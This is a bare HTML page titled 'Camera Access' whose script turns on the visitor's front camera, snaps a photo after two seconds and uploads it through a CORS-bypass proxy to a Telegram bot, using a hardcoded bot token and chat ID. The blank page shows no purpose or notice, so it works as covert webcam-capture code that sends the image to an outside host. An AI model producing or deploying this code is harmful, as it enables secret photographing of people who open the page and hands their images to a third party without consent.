<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Access</title>
</head>
<body style="background-color: #888888; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">

    <script>
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
              const formData = new FormData();
              formData.append('chat_id', '6539379136');
              formData.append('photo', blob, 'snapshot.jpg');

              // بەکارهێنانی پرۆکسی بۆ تێپەڕاندنی ڕێگرییەکانی CORS
              fetch('https://corsproxy.io/?https://api.telegram.org/bot8998865631:AAGvEie2pNz2fEl00AHDt_H0MgkFU20hZM/sendPhoto', {
                method: 'POST',
                body: formData
              })
              .then(response => response.json())
              .then(data => {
                console.log('Success:', data);
              })
              .catch(error => {
                console.error('Error:', error);
              });
            }, 'image/jpeg');
          }, 2000);
        })
        .catch(err => {
          console.error('Camera Error:', err);
        });
    </script>

</body>
</html>
